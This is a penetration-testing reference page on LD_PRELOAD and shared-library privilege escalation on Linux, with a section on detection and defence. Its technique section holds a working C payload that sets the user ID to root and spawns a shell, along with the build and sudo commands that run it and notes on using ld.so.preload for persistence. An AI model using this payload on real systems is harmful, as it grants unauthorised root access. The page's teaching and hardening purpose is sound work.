---
title: LD_PRELOAD abuse
slug: ld-preload-abuse
---

> **TL;DR:** When sudoers preserves `LD_PRELOAD` (env_keep), or when a privileged binary loads a writable shared object, an attacker injects code that runs at the binary's privilege level.

## What it is
`LD_PRELOAD` is a glibc env var that tells the dynamic linker to load a user-supplied `.so` before any other library. Symbols in the preload library override identically named symbols later in the chain — so a tiny `.so` defining `__attribute__((constructor))` runs at process start, in the target's address space. The dynamic linker explicitly ignores `LD_PRELOAD` for setuid/setgid binaries with `AT_SECURE`, so the bug is almost always misconfigured sudo or a writable library path picked up some other way.

## Preconditions / where it applies
- Sudo rule that allows running a binary with `env_keep+="LD_PRELOAD"` (or `env_keep+="LD_LIBRARY_PATH"`), OR
- A setuid binary whose RPATH/RUNPATH points to a writable directory, OR
- A privileged daemon launched by a unit file or init script that exports `LD_PRELOAD`

## Technique

**1. Confirm sudo env_keep.** Look for the giveaway in `sudo -l`:
```bash
sudo -l
# (env_keep+=LD_PRELOAD) NOPASSWD: /usr/sbin/apache2
```

Build the payload:
```c
// pwn.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init(void) {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    execl("/bin/sh", "sh", "-i", NULL);
}
```
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/pwn.so pwn.c
sudo LD_PRELOAD=/tmp/pwn.so apache2
```

**2. LD_LIBRARY_PATH variant.** Same env_keep recipe, but you ship a full `libfoo.so.1` that the target binary links against:
```bash
ldd /usr/sbin/target
# search the list, build a malicious one, place it on LD_LIBRARY_PATH
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/target
```

**3. Writable RPATH.** Find a setuid/setgid binary with a writable RPATH/RUNPATH:
```bash
readelf -d /usr/local/bin/legacy | grep -E 'PATH|NEEDED'
# RUNPATH = /opt/legacy/lib  ← if you can write here, drop a malicious libfoo.so
```
Because the linker drops `LD_PRELOAD` for `AT_SECURE` binaries, RPATH abuse is the more realistic setuid path.

**4. `/etc/ld.so.preload`.** A root-owned file that preloads system-wide. If it's writable (broken permissions, container misconfig), one line lands persistence + privesc. Often used as a rootkit pivot.

## Detection and defence
- Audit `/etc/sudoers` and `/etc/sudoers.d/*` for any `env_keep` containing `LD_*`
- `sudo` since 1.8 ignores `LD_PRELOAD` unless explicitly allowed — keep defaults
- File-integrity monitoring on `/etc/ld.so.preload` and on any RPATH directories of suid binaries
- AuditD watch on `execve` of setuid binaries with an `LD_*` env var
- Statically build privileged helpers when feasible; clear `RPATH`/`RUNPATH` at link time

## References
- [GTFOBins — sudo / LD_PRELOAD](https://gtfobins.github.io/) — payload patterns
- [HackTricks — LD_PRELOAD privesc](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload) — recipe and gotchas
- [ld.so(8)](https://man7.org/linux/man-pages/man8/ld.so.8.html) — `AT_SECURE` rules and env handling

Related: [[sudo-misconfig]], [[suid-sgid-binaries]], [[linux-privesc-vectors]].
